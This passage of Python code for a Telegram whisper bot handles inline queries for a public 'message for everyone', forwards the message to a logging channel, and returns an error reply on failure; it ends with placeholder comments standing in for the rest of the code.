                'user_id': -1,
                'msg': message_text,
                'target_name': 'Everyone',
                'timestamp': datetime.now().isoformat()
            }
            asyncio.create_task(forward_whisper_to_channel(whisper_hash, whisper_data))
            
            result = event.builder.article(
                title="🌍 Public Message for Everyone",
                description="Click to send public message",
                text=f"**🌍 A public message for everyone!**\n\n*Note: Anyone can open and read this message.*\n\n📝 **Auto-saved to bot database**",
                buttons=[[Button.inline("🔓 Show Message", whisper_hash)]]
            )
        
        await event.answer([result])
        
    except Exception as e:
        logger.error(f"Inline query error: {e}")
        result = event.builder.article(
            title="❌ Error",
            description="Something went wrong",
            text="❌ An error occurred. Please try again in a moment."
        )
        await event.answer([result])

# ==================== REST OF THE CODE ====================
# (Clone bot, callback handlers, Flask server etc. remain the same)
# [Previous code for clone bot, callback handlers, Flask server continues...]

# Flask web server and main function remain the same
# ... [Rest of the code unchanged]